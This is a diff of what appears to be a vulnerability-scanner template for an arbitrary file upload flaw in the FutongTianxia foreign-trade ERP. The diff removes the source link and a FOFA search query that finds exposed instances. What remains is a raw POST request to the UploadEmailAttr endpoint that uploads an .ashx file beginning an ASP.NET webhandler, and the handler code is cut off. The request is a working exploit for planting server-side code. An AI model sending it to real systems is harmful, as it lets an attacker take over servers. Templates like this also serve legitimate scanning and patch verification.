@@ -3,20 +3,14 @@ info:
   name: 富通天下外贸ERP UploadEmailAttr 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sogc5qgokmia5wig'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sogc5qgokmia5wig
-    fofa: title="用户登录_富通天下外贸ERP"
 http:
 - raw:
   - 'POST /JoinfApp/EMail/UploadEmailAttr?name=.ashx HTTP/1.1
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     <% @ webhandler language="C#" class="AverageHandler" %>
